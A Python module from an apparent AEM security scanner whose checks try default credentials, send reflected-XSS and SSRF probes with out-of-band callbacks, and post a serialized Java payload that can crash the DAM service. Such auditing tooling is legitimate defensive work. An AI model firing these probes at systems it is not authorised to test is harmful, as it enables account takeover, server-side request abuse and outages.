"""
Legacy AEM CVE Checks (aem-hacker / 0ang3el)
============================================
Implements checks derived from https://github.com/vulnerabilitylabs/aem-hacker
covering classical AEM vulnerability classes, many with assigned CVEs.

References:
  - Hunting for Security Bugs in AEM: https://speakerdeck.com/0ang3el/hunting-for-security-bugs-in-aem-webapps
  - CVE-2016-7882 (WCMDebugFilter XSS)
  - CVE-2015-1833 (Jackrabbit WebDAV XXE)
  - CVE-2018-5006 (Salesforce SSRF)
  - CVE-2018-12809 (ReportingServices SSRF)
"""
from __future__ import annotations

import base64
from typing import List, Optional

from .base import Check, CheckContext, CheckOutcome
from ..models import Evidence, Finding

_DEFAULT_CREDS = [
    ("admin", "admin"),
    ("author", "author"),
    ("replication-receiver", "replication-receiver"),
    ("anonymous", ""),
    ("admin", "Password1"),
    ("admin", ""),
    ("vgnadmin", "vgnadmin"),
    ("apparker@geometrixx.info", "aparker"),
]


def _ev(url: str, status: Optional[int], hash_: str, text: str, rationale: str) -> Evidence:
    return Evidence(
        endpoint=url,
        status_code=status,
        response_hash=hash_,
        snippet=(text or "")[:280].replace("\n", " "),
        rationale=rationale,
    )


def _basic_auth(username: str, password: str) -> str:
    return base64.b64encode(f"{username}:{password}".encode()).decode()


# ---------------------------------------------------------------------------
# AEM-CREDS-001 — Default credential check
# ---------------------------------------------------------------------------

class DefaultCredentialsCheck(Check):
    check_id = "AEM-CREDS-001"
    name = "default-credentials"
    tags = ["cve", "default-creds", "auth", "active"]
    profiles = ["standard", "deep", "authenticated-deep"]
    active = True

    def run(self, ctx: CheckContext) -> CheckOutcome:
        findings: List[Finding] = []

        probe_paths = [
            "/system/sling/loginstatus",
            "/libs/granite/security/currentuser.json",
            "/libs/cq/security/userinfo.json",
        ]

        for username, password in _DEFAULT_CREDS:
            auth_header = _basic_auth(username, password)
            for path in probe_paths:
                result = ctx.client.request(
                    "GET", path,
                    headers={"Authorization": f"Basic {auth_header}"},
                )
                if result.error:
                    continue

                body = result.text or ""
                confirmed = (
                    (result.status_code == 200 and "authenticated=true" in body)
                    or (result.status_code == 200 and "authorizableId" in body and "anonymous" not in body)
                    or (result.status_code == 200 and "userID" in body and "anonymous" not in body)
                )
                if confirmed:
                    findings.append(
                        Finding(
                            check_id=self.check_id,
                            title=f"Default credentials work: {username}:{password}",
                            severity="critical",
                            category="default_credentials",
                            evidence=_ev(
                                url=result.url,
                                status=result.status_code,
                                hash_=result.response_hash,
                                text=body,
                                rationale=(
                                    f"Authentication succeeded with {username}:{password} "
                                    f"at {path} (HTTP {result.status_code}). "
                                    "Valid session confirmed via loginStatus/currentUser response."
                                ),
                            ),
                            recommendation=(
                                "Change default credentials immediately. "
                                "Rotate all AEM admin/author passwords and enforce strong password policy. "
                                "Restrict admin endpoints to management IP ranges."
                            ),
                        )
                    )
                    break  # One hit per cred set is enough

        return CheckOutcome(findings=findings, artifacts=[])


# ---------------------------------------------------------------------------
# AEM-XSS-001 — WCMDebugFilter reflected XSS (CVE-2016-7882)
# ---------------------------------------------------------------------------

class WCMDebugFilterCheck(Check):
    check_id = "AEM-XSS-001"
    name = "wcmdebugfilter-xss"
    tags = ["cve", "cve-2016-7882", "xss", "reflected"]
    profiles = ["standard", "deep", "authenticated-deep"]

    def run(self, ctx: CheckContext) -> CheckOutcome:
        findings: List[Finding] = []

        probe_paths = [
            "/.json?debug=layout",
            "/content.json?debug=layout",
            "/content.1.json?debug=layout",
            "/content.json.html?debug=layout",
            "/content.4.2.1...json?debug=layout",
            "///content.json?debug=layout",
        ]

        for path in probe_paths:
            result = ctx.client.request("GET", path)
            if result.error:
                continue
            body = result.text or ""
            if result.status_code == 200 and "res=" in body and "sel=" in body:
                findings.append(
                    Finding(
                        check_id=self.check_id,
                        title="WCMDebugFilter exposed — potential reflected XSS (CVE-2016-7882)",
                        severity="high",
                        category="xss",
                        evidence=_ev(
                            url=result.url,
                            status=result.status_code,
                            hash_=result.response_hash,
                            text=body,
                            rationale=(
                                "WCMDebugFilter responded with layout debug output (res= and sel= markers). "
                                "The filter unsafely reflects request parameters, enabling reflected XSS. "
                                "Reference: CVE-2016-7882 | "
                                "https://medium.com/@jonathanbouman/reflected-xss-at-philips-com-e48bf8f9cd3c"
                            ),
                        ),
                        recommendation=(
                            "Apply the APSB16-38 patch. "
                            "Disable WCMDebugFilter in production via OSGi config: "
                            "set wcm.debug.mode=disabled or restrict ?debug= parameter."
                        ),
                    )
                )
                break

        return CheckOutcome(findings=findings, artifacts=[])


# ---------------------------------------------------------------------------
# AEM-XSS-002 — WCMSuggestions reflected XSS
# ---------------------------------------------------------------------------

class WCMSuggestionsCheck(Check):
    check_id = "AEM-XSS-002"
    name = "wcmsuggestions-xss"
    tags = ["cve", "xss", "reflected", "wcm"]
    profiles = ["standard", "deep", "authenticated-deep"]

    _PROBE_MARKER = "1337xssabcdef"

    def run(self, ctx: CheckContext) -> CheckOutcome:
        findings: List[Finding] = []

        probe_paths = [
            f"/bin/wcm/contentfinder/connector/suggestions.json?query_term=path%3a/&pre=<{self._PROBE_MARKER}>&post=yyyy",
            f"/bin/wcm/contentfinder/connector/suggestions.css?query_term=path%3a/&pre=<{self._PROBE_MARKER}>&post=yyyy",
            f"///bin///wcm///contentfinder///connector///suggestions.json?query_term=path%3a/&pre=<{self._PROBE_MARKER}>&post=yyyy",
        ]

        for path in probe_paths:
            result = ctx.client.request("GET", path)
            if result.error:
                continue
            body = result.text or ""
            if result.status_code == 200 and f"<{self._PROBE_MARKER}>" in body:
                findings.append(
                    Finding(
                        check_id=self.check_id,
                        title="WCMSuggestionsServlet reflected XSS via pre/post parameters",
                        severity="high",
                        category="xss",
                        evidence=_ev(
                            url=result.url,
                            status=result.status_code,
                            hash_=result.response_hash,
                            text=body,
                            rationale=(
                                f"XSS marker <{self._PROBE_MARKER}> reflected unencoded in response. "
                                "The pre= and post= query parameters are reflected directly into the output "
                                "without HTML encoding, enabling reflected XSS. "
                                "Reference: https://speakerdeck.com/0ang3el/hunting-for-security-bugs-in-aem-webapps?slide=96"
                            ),
                        ),
                        recommendation=(
                            "Apply the relevant AEM security patch. "
                            "Block /bin/wcm/contentfinder/connector/suggestions at the Dispatcher "
                            "or ensure the pre/post parameters are properly HTML-encoded before reflection."
                        ),
                    )
                )
                break

        return CheckOutcome(findings=findings, artifacts=[])


# ---------------------------------------------------------------------------
# AEM-XSS-003 — SWF-based reflected XSS
# ---------------------------------------------------------------------------

_SWF_PROBES = [
    "/etc/clientlibs/foundation/video/swf/player_flv_maxi.swf",
    "/etc/clientlibs/foundation/video/swf/player_flv_maxi.swf.res",
    "/etc/clientlibs/foundation/shared/endorsed/swf/slideshow.swf",
    "/etc/clientlibs/foundation/video/swf/StrobeMediaPlayback.swf",
    "/libs/dam/widgets/resources/swfupload/swfupload_f9.swf",
    "/libs/cq/ui/resources/swfupload/swfupload.swf",
    "/etc/dam/viewers/s7sdk/2.11/flash/VideoPlayer.swf",
    "/etc/dam/viewers/s7sdk/2.9/flash/VideoPlayer.swf",
    "/etc/dam/viewers/s7sdk/3.2/flash/VideoPlayer.swf",
]


class SWFXSSCheck(Check):
    check_id = "AEM-XSS-003"
    name = "swf-xss"
    tags = ["cve", "xss", "swf", "flash"]
    profiles = ["standard", "deep", "authenticated-deep"]

    def run(self, ctx: CheckContext) -> CheckOutcome:
        findings: List[Finding] = []

        for path in _SWF_PROBES:
            result = ctx.client.request("GET", path)
            if result.error:
                continue
            ct = result.headers.get("content-type", "").lower().split(";")[0].strip()
            cd = result.headers.get("content-disposition", "")
            if (
                result.status_code == 200
                and ct == "application/x-shockwave-flash"
                and not cd
            ):
                findings.append(
                    Finding(
                        check_id=self.check_id,
                        title=f"SWF file exposed without Content-Disposition — reflected XSS risk",
                        severity="medium",
                        category="xss",
                        evidence=_ev(
                            url=result.url,
                            status=result.status_code,
                            hash_=result.response_hash,
                            text="",
                            rationale=(
                                f"SWF file served at {path} with content-type={ct} "
                                "and no Content-Disposition: attachment header. "
                                "Legacy SWF files in AEM accept URL parameters that are reflected "
                                "into ActionScript, enabling reflected XSS in Flash-capable browsers. "
                                "Reference: https://speakerdeck.com/fransrosen/a-story-of-the-passive-aggressive-sysadmin-of-aem?slide=61"
                            ),
                        ),
                        recommendation=(
                            "Remove legacy SWF files from the AEM instance. "
                            "Add Content-Disposition: attachment to SWF responses. "
                            "Block /etc/clientlibs/foundation/*swf and /libs/*swfupload at the Dispatcher."
                        ),
                    )
                )

        return CheckOutcome(findings=findings, artifacts=[])


# ---------------------------------------------------------------------------
# AEM-SSRF-002 — Salesforce SSRF (CVE-2018-5006)
# ---------------------------------------------------------------------------

class SalesforceSSRFCheck(Check):
    check_id = "AEM-SSRF-002"
    name = "salesforce-ssrf"
    tags = ["cve", "cve-2018-5006", "ssrf", "active"]
    profiles = ["deep", "authenticated-deep"]
    active = True

    def run(self, ctx: CheckContext) -> CheckOutcome:
        findings: List[Finding] = []

        oob = ctx.config.oob_collector
        if not oob:
            return CheckOutcome(findings=[], artifacts=[])

        callback = oob

        probe_paths = [
            f"/libs/mcm/salesforce/customer.json?checkType=authorize&authorization_url={callback}%23&customer_key=zzzz&customer_secret=zzzz&redirect_uri=xxxx&code=e",
            f"///libs///mcm///salesforce///customer.json?checkType=authorize&authorization_url={callback}%23&customer_key=zzzz&customer_secret=zzzz&redirect_uri=xxxx&code=e",
            f"/libs/mcm/salesforce/customer.1.json?checkType=authorize&authorization_url={callback}%23&customer_key=zzzz&customer_secret=zzzz&redirect_uri=xxxx&code=e",
        ]

        for path in probe_paths:
            result = ctx.client.request("GET", path)
            if result.error:
                continue
            if result.status_code in (200, 302, 400):
                findings.append(
                    Finding(
                        check_id=self.check_id,
                        title="Salesforce SSRF endpoint reachable (CVE-2018-5006)",
                        severity="high",
                        category="ssrf",
                        evidence=_ev(
                            url=result.url,
                            status=result.status_code,
                            hash_=result.response_hash,
                            text=result.text,
                            rationale=(
                                f"SalesforceSecretServlet responded HTTP {result.status_code} with "
                                f"OOB URL: {callback}. "
                                "If the OOB collector receives a callback, SSRF is confirmed. "
                                "Reference: CVE-2018-5006 | APSB18-23 | "
                                "https://helpx.adobe.com/security/products/experience-manager/apsb18-23.html"
                            ),
                        ),
                        recommendation=(
                            "Block /libs/mcm/salesforce at the Dispatcher. "
                            "Apply the APSB18-23 patch. "
                            "Check OOB collector for incoming callbacks to confirm exploitability."
                        ),
                    )
                )
                break

        return CheckOutcome(findings=findings, artifacts=[])


# ---------------------------------------------------------------------------
# AEM-SSRF-003 — ReportingServices SSRF (CVE-2018-12809)
# ---------------------------------------------------------------------------

class ReportingServicesSSRFCheck(Check):
    check_id = "AEM-SSRF-003"
    name = "reportingservices-ssrf"
    tags = ["cve", "cve-2018-12809", "ssrf", "active"]
    profiles = ["deep", "authenticated-deep"]
    active = True

    def run(self, ctx: CheckContext) -> CheckOutcome:
        findings: List[Finding] = []

        oob = ctx.config.oob_collector
        if not oob:
            return CheckOutcome(findings=[], artifacts=[])

        callback = oob

        probe_paths = [
            f"/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet?url={callback}%23/api1.omniture.com/a&q=a",
            f"///libs///cq///contentinsight///proxy///reportingservices.json.GET.servlet?url={callback}%23/api1.omniture.com/a&q=a",
            f"/libs/cq/contentinsight/content/proxy.reportingservices.json?url={callback}%23/api1.omniture.com/a&q=a",
        ]

        for path in probe_paths:
            result = ctx.client.request("GET", path)
            if result.error:
                continue
            if result.status_code in (200, 302, 400):
                findings.append(
                    Finding(
                        check_id=self.check_id,
                        title="ReportingServices SSRF endpoint reachable (CVE-2018-12809)",
                        severity="high",
                        category="ssrf",
                        evidence=_ev(
                            url=result.url,
                            status=result.status_code,
                            hash_=result.response_hash,
                            text=result.text,
                            rationale=(
                                f"ReportingServicesServlet responded HTTP {result.status_code} with "
                                f"OOB URL: {callback}. "
                                "If the OOB collector receives a callback, SSRF is confirmed and may lead to RCE. "
                                "Reference: CVE-2018-12809 | APSB18-23 | "
                                "https://helpx.adobe.com/security/products/experience-manager/apsb18-23.html"
                            ),
                        ),
                        recommendation=(
                            "Block /libs/cq/contentinsight at the Dispatcher. "
                            "Apply the APSB18-23 patch. "
                            "Check OOB collector for incoming callbacks."
                        ),
                    )
                )
                break

        return CheckOutcome(findings=findings, artifacts=[])


# ---------------------------------------------------------------------------
# AEM-SSRF-004 — SiteCatalyst SSRF
# ---------------------------------------------------------------------------

class SiteCatalystSSRFCheck(Check):
    check_id = "AEM-SSRF-004"
    name = "sitecatalyst-ssrf"
    tags = ["cve", "ssrf", "sitecatalyst", "active"]
    profiles = ["deep", "authenticated-deep"]
    active = True

    def run(self, ctx: CheckContext) -> CheckOutcome:
        findings: List[Finding] = []

        oob = ctx.config.oob_collector
        if not oob:
            return CheckOutcome(findings=[], artifacts=[])

        callback = oob

        probe_paths = [
            f"/libs/cq/analytics/components/sitecatalystpage/segments.json.servlet?datacenter={callback}%23&company=xxx&username=zzz&secret=yyyy",
            f"///libs///cq///analytics///components///sitecatalystpage///segments.json.servlet?datacenter={callback}%23&company=xxx&username=zzz&secret=yyyy",
            f"/libs/cq/analytics/templates/sitecatalyst/jcr:content.segments.json?datacenter={callback}%23&company=xxx&username=zzz&secret=yyyy",
        ]

        for path in probe_paths:
            result = ctx.client.request("GET", path)
            if result.error:
                continue
            if result.status_code in (200, 302, 400):
                findings.append(
                    Finding(
                        check_id=self.check_id,
                        title="SiteCatalyst SSRF endpoint reachable — potential RCE pivot",
                        severity="high",
                        category="ssrf",
                        evidence=_ev(
                            url=result.url,
                            status=result.status_code,
                            hash_=result.response_hash,
                            text=result.text,
                            rationale=(
                                f"SiteCatalystServlet responded HTTP {result.status_code} with "
                                f"OOB URL: {callback}. "
                                "Confirmed SSRF via this servlet can be leveraged for RCE on "
                                "pre-AEM-6.2-SP1-CFP7 Jetty installations. "
                                "Reference: https://speakerdeck.com/0ang3el/hunting-for-security-bugs-in-aem-webapps?slide=87"
                            ),
                        ),
                        recommendation=(
                            "Block /libs/cq/analytics at the Dispatcher. "
                            "Apply the relevant AEM security patch. "
                            "Check OOB collector for callbacks, then attempt SSRF-to-RCE chain."
                        ),
                    )
                )
                break

        return CheckOutcome(findings=findings, artifacts=[])


# ---------------------------------------------------------------------------
# AEM-SSRF-005 — OpenSocial (Shindig) proxy SSRF
# ---------------------------------------------------------------------------

class OpenSocialSSRFCheck(Check):
    check_id = "AEM-SSRF-005"
    name = "opensocial-ssrf"
    tags = ["cve", "ssrf", "opensocial", "shindig", "active"]
    profiles = ["deep", "authenticated-deep"]
    active = True

    def run(self, ctx: CheckContext) -> CheckOutcome:
        findings: List[Finding] = []

        oob = ctx.config.oob_collector
        if not oob:
            return CheckOutcome(findings=[], artifacts=[])

        callback = oob

        # Proxy variant
        proxy_paths = [
            f"/libs/opensocial/proxy?container=default&url={callback}",
            f"///libs///opensocial///proxy?container=default&url={callback}",
            f"/libs/opensocial/proxy.json?container=default&url={callback}",
        ]
        # makeRequest variant
        makerequest_paths = [
            f"/libs/opensocial/makeRequest?url={callback}",
            f"///libs///opensocial///makeRequest?url={callback}",
            f"/libs/opensocial/makeRequest.json?url={callback}",
        ]

        for path in proxy_paths:
            result = ctx.client.request("GET", path)
            if result.error:
                continue
            if result.status_code in (200, 302):
                findings.append(
                    Finding(
                        check_id=self.check_id,
                        title="OpenSocial (Shindig) proxy SSRF endpoint reachable",
                        severity="high",
                        category="ssrf",
                        evidence=_ev(
                            url=result.url,
                            status=result.status_code,
                            hash_=result.response_hash,
                            text=result.text,
                            rationale=(
                                f"Opensocial proxy responded HTTP {result.status_code} with OOB URL: {callback}. "
                                "If OOB callback received, full SSRF confirmed. "
                                "Reference: https://speakerdeck.com/fransrosen/a-story-of-the-passive-aggressive-sysadmin-of-aem?slide=41"
                            ),
                        ),
                        recommendation=(
                            "Block /libs/opensocial at the Dispatcher. "
                            "Check OOB collector for callbacks."
                        ),
                    )
                )
                break

        for path in makerequest_paths:
            result = ctx.client.request(
                "POST", path,
                data={"httpMethod": "GET"},
                headers={"Content-Type": "application/x-www-form-urlencoded"},
            )
            if result.error:
                continue
            if result.status_code in (200, 302):
                findings.append(
                    Finding(
                        check_id=self.check_id,
                        title="OpenSocial (Shindig) makeRequest SSRF endpoint reachable",
                        severity="high",
                        category="ssrf",
                        evidence=_ev(
                            url=result.url,
                            status=result.status_code,
                            hash_=result.response_hash,
                            text=result.text,
                            rationale=(
                                f"Opensocial makeRequest responded HTTP {result.status_code} with OOB URL: {callback}. "
                                "makeRequest supports httpMethod, postData, headers, contentType parameters. "
                                "Reference: https://speakerdeck.com/0ang3el/hunting-for-security-bugs-in-aem-webapps"
                            ),
                        ),
                        recommendation=(
                            "Block /libs/opensocial at the Dispatcher. "
                            "Check OOB collector for callbacks."
                        ),
                    )
                )
                break

        return CheckOutcome(findings=findings, artifacts=[])


# ---------------------------------------------------------------------------
# AEM-WEBDAV-001 — WebDAV exposure (CVE-2015-1833)
# ---------------------------------------------------------------------------

class WebDAVExposureCheck(Check):
    check_id = "AEM-WEBDAV-001"
    name = "webdav-exposure"
    tags = ["cve", "cve-2015-1833", "webdav", "xxe"]
    profiles = ["standard", "deep", "authenticated-deep"]

    def run(self, ctx: CheckContext) -> CheckOutcome:
        findings: List[Finding] = []

        probe_paths = [
            "/crx/repository/test",
            "/crx/repository/test.sh",
            "/crx/repository/crx.default",
            "///crx///repository///test",
        ]

        for path in probe_paths:
            result = ctx.client.request("GET", path)
            if result.error:
                continue
            www_auth = result.headers.get("www-authenticate", "").lower()
            if result.status_code == 401 and "webdav" in www_auth:
                findings.append(
                    Finding(
                        check_id=self.check_id,
                        title="WebDAV endpoint exposed — potential XXE (CVE-2015-1833)",
                        severity="high",
                        category="webdav",
                        evidence=_ev(
                            url=result.url,
                            status=result.status_code,
                            hash_=result.response_hash,
                            text=result.text,
                            rationale=(
                                f"WebDAV challenge received at {path}: WWW-Authenticate: {www_auth[:80]}. "
                                "Exposed WebDAV allows XML-based operations that may be vulnerable to XXE (CVE-2015-1833). "
                                "Reference: CVE-2015-1833 | "
                                "http://mail-archives.apache.org/mod_mbox/jackrabbit-announce/201505.mbox/"
                            ),
                        ),
                        recommendation=(
                            "Restrict WebDAV access (/crx/repository) to trusted admin IP ranges only. "
                            "Apply CVE-2015-1833 patch (Jackrabbit 2.11.0+). "
                            "Disable WebDAV servlet if not required."
                        ),
                    )
                )
                break

        return CheckOutcome(findings=findings, artifacts=[])


# ---------------------------------------------------------------------------
# AEM-AUDIT-001 — AuditLog servlet exposure
# ---------------------------------------------------------------------------

class AuditLogServletCheck(Check):
    check_id = "AEM-AUDIT-001"
    name = "auditlog-servlet"
    tags = ["exposure", "audit", "information-disclosure"]
    profiles = ["standard", "deep", "authenticated-deep"]

    def run(self, ctx: CheckContext) -> CheckOutcome:
        findings: List[Finding] = []

        import json

        probe_paths = [
            "/bin/msm/audit.json",
            "///bin///msm///audit.json",
            "/bin/msm/audit.json.1.json",
            "/bin/msm/audit.css",
        ]

        for path in probe_paths:
            result = ctx.client.request("GET", path)
            if result.error:
                continue
            if result.status_code == 200:
                body = result.text or ""
                try:
                    data = json.loads(body)
                    count = int(data.get("results", data.get("total", 0)))
                except Exception:
                    count = 0
                if count > 0 or ('"actions"' in body or '"results"' in body):
                    findings.append(
                        Finding(
                            check_id=self.check_id,
                            title="AuditLog servlet exposes audit records without authentication",
                            severity="medium",
                            category="information_disclosure",
                            evidence=_ev(
                                url=result.url,
                                status=result.status_code,
                                hash_=result.response_hash,
                                text=body,
                                rationale=(
                                    f"AuditLogServlet at {path} returned HTTP 200 with audit log content. "
                                    "Audit logs may reveal usernames, content paths, and admin activity. "
                                    "Reference: https://speakerdeck.com/0ang3el/hunting-for-security-bugs-in-aem-webapps"
                                ),
                            ),
                            recommendation=(
                                "Block /bin/msm/audit at the Dispatcher. "
                                "Restrict access to authenticated admin sessions via CQ ACL."
                            ),
                        )
                    )
                    break

        return CheckOutcome(findings=findings, artifacts=[])


# ---------------------------------------------------------------------------
# AEM-DESER-001 — ExternalJobServlet / DAM deserialization probe
# ---------------------------------------------------------------------------

class ExternalJobDeserCheck(Check):
    check_id = "AEM-DESER-001"
    name = "externaljob-deserialization"
    tags = ["cve", "deserialization", "active", "dam"]
    profiles = ["deep", "authenticated-deep"]
    active = True
    state_changing = True  # sends a Java deser payload that can trigger OOM / crash DAM

    # Minimal Java deserialization OIS marker (non-exploitative data)
    _OIS_MARKER = base64.b64decode(
        "rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cH////c="
    )

    def run(self, ctx: CheckContext) -> CheckOutcome:
        findings: List[Finding] = []

        probe_paths = [
            "/libs/dam/cloud/proxy.json",
            "/libs/dam/cloud/proxy.css",
            "///libs///dam///cloud///proxy.json",
        ]

        files = {":operation": (None, "job"), "file": ("jobevent", self._OIS_MARKER, "application/octet-stream")}

        for path in probe_paths:
            result = ctx.client.request(
                "POST", path,
                files=files,
                headers={"Referer": ctx.client.base_url},
            )
            if result.error:
                continue
            body = result.text or ""
            if result.status_code == 500 and "Java heap space" in body:
                findings.append(
                    Finding(
                        check_id=self.check_id,
                        title="ExternalJobServlet likely vulnerable to Java deserialization (OOM trigger confirmed)",
                        severity="critical",
                        category="deserialization",
                        evidence=_ev(
                            url=result.url,
                            status=result.status_code,
                            hash_=result.response_hash,
                            text=body[:300],
                            rationale=(
                                "Probe OIS payload triggered 'Java heap space' OOM, confirming the servlet "
                                "processes untrusted serialized Java objects. An exploitable payload (e.g. ysoserial) "
                                "will achieve RCE. Reference: "
                                "https://speakerdeck.com/0ang3el/hunting-for-security-bugs-in-aem-webapps?slide=102"
                            ),
                        ),
                        recommendation=(
                            "Block /libs/dam/cloud/proxy at the Dispatcher. "
                            "Apply the relevant AEM security patch disabling ExternalJobServlet. "
                            "Deploy Java deserialization firewall (SerialKiller / Contrast Security)."
                        ),
                    )
                )
                break

        return CheckOutcome(findings=findings, artifacts=[])
